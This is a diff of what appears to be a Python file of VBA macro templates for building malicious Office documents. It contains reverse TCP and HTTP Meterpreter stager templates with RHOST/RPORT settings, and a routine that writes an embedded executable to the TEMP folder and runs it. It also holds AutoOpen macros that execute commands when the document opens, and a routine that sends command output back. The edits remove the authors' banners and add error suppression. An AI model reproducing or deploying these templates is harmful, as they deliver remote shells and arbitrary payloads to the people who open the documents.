@@ -262,6 +262,7 @@ Private Sub loadEmbeddedDll()
     If Dir(dll_Loc, vbDirectory) = vbNullString Then
         Exit Sub
     End If
+    ChDir dll_Loc
     DumpFile "Document1.asd"
     <<<MODULE_2>>>.Invoke 
 End Sub
@@ -276,21 +277,6 @@ End Sub
 
 METERPRETER =  \
 r"""
-'   _____                                _____          __
-'  /     \ _____    ___________  ____   /     \   _____/  |_  ___________
-' /  \ /  \\__  \ _/ ___\_  __ \/  _ \ /  \ /  \_/ __ \   __\/ __ \_  __ \
-'/    Y    \/ __ \\  \___|  | \(  <_> )    Y    \  ___/|  | \  ___/|  | \/
-'\____|__  (____  /\___  >__|   \____/\____|__  /\___  >__|  \___  >__|
-'        \/     \/     \/                     \/     \/          \/
-
-'                       Metasploit Big Game Phising Bait - by Cn33liz 2017
-
-' Original Repo: https://github.com/Cn33liz/MacroMeter
-
-'VBA Reversed TCP Meterpreter Stager
-'CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
-'https://github.com/tyranid/DotNetToJScript
-
 
 Public RHOST As String 
 Public RPORT As String
@@ -323,18 +309,6 @@ exploit -j
 
 WEBMETER =  \
 r"""
-'____   ______________  ___________      __      ___.       _____          __                
-'\   \ /   /\______   \/   _____/  \    /  \ ____\_ |__    /     \   _____/  |_  ___________ 
-' \   Y   /  |    |  _/\_____  \\   \/\/   // __ \| __ \  /  \ /  \_/ __ \   __\/ __ \_  __ \
-'  \     /   |    |   \/        \\        /\  ___/| \_\ \/    Y    \  ___/|  | \  ___/|  | \/
-'   \___/    |______  /_______  / \__/\  /  \___  >___  /\____|__  /\___  >__|  \___  >__|   
-'                   \/        \/       \/       \/    \/         \/     \/          \/       
-
-'VBScript Reversed HTTP/HTTPS Meterpreter Stager - by Cn33liz 2017
-'CSharp Meterpreter Stager build by Cn33liz and embedded within VBScript using DotNetToJScript from James Forshaw
-'https://github.com/tyranid/DotNetToJScript
-
-'This Stager is Proxy aware and should run on x86 as well as x64
 
 Public RHOST As String 
 Public RPORT As String
@@ -369,11 +343,15 @@ exploit -j
 
 EMBED_EXE = \
 r"""
-'Option Explicit
 
 Private Sub executeEmbed()
-    DumpFile "<<<OUT_FILE>>>"
-    ExecuteCmdAsync "<<<OUT_FILE>>>"
+
+    Dim fileName As String
+    fileName = "\<<<FILE_NAME>>>"
+    Dim fullPath As String
+    fullPath = Environ("TEMP") & fileName
+    DumpFile fullPath
+    ExecuteCmdAsync fullPath
 End Sub
 
 ' Auto launch when VBA enabled
@@ -387,7 +365,7 @@ CMD = \
 r"""
 
 Sub AutoOpen()
-    ExecuteCmdAsync "<<<CMD>>>"
+    ExecuteCmdAsync "<<<CMDLINE>>>"
 End Sub
 
 """
@@ -408,6 +386,8 @@ Private Sub Main()
     msg = "<<<TEMPLATE>>>"
     On Error GoTo byebye
     msg = ExecuteCmdSync(msg)
+    On Error Resume Next
+    Err.Clear
     SendResponse msg
     On Error GoTo 0
     byebye:
